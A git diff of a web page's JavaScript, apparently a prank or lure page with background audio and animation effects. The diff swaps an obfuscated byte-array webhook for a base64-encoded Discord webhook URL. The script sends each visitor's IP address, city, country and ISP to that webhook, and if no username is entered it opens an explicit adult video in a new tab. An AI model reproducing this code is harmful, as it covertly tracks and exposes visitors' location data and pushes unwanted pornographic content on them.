@@ -1,12 +1,4 @@
-const webhookBytes = [
-    0x512, 0x489, 0x743, 0x298, 0x456, 0x321, 0x167, 0x432, 0x509, 0x234, 0x345, 0x432,
-    0x123, 0x456, 0x789, 0x321, 0x654, 0x789, 0x432, 0x198, 0x765, 0x432, 0x198, 0x765,
-    0x432, 0x198, 0x765, 0x432, 0x198, 0x765, 0x432, 0x198, 0x765, 0x432, 0x198, 0x765
-];
-
-function decryptWebhook() {
-    return webhookBytes.map(byte => String.fromCharCode(byte % 512)).join('');
-}
+const webhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNTY1NDE1MDg5MzE0MjExNi9rZ015VktYNDM1bzhWVy1XSENXWDB2Zk82RkN5enB2MzhkNk81clNmd3ZNVUZKOXJPUHB5VXYzQVZxTUVMRlMtVm9D';
 
 let audioInitialized = false;
 
@@ -24,7 +16,7 @@ const effects = ['bounce', 'flash', 'pulse', 'rubberBand', 'shake', 'swing', 'ta
 
 function validateWebhookData(data, ipData) {
     const fields = data.embeds[0].fields;
-    return fields.some(field =>
+    return fields.some(field => 
         field.value === ipData.ip ||
         field.value === `${ipData.city}, ${ipData.country_name}` ||
         field.value === ipData.isp
@@ -37,7 +29,7 @@ function promptUser() {
 
     if (username) {
         console.log("Username entered:", username);
-
+        
         const audio = document.getElementById('backgroundAudio');
         if (audio) {
             audio.pause();
@@ -70,7 +62,7 @@ function promptUser() {
                 };
 
                 if (validateWebhookData(webhookData, data)) {
-                    return fetch(decryptWebhook(), {
+                    return fetch(atob(webhookUrl), {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -86,7 +78,7 @@ function promptUser() {
             })
             .catch(error => console.log('Operation error:', error));
     } else {
-        for (let i = 0; i < 15; i++) {
+        for(let i = 0; i < 1; i++) {
             window.open("https://www.pornhub.com/view_video.php?viewkey=672298c5e2062", "_blank");
         }
     }
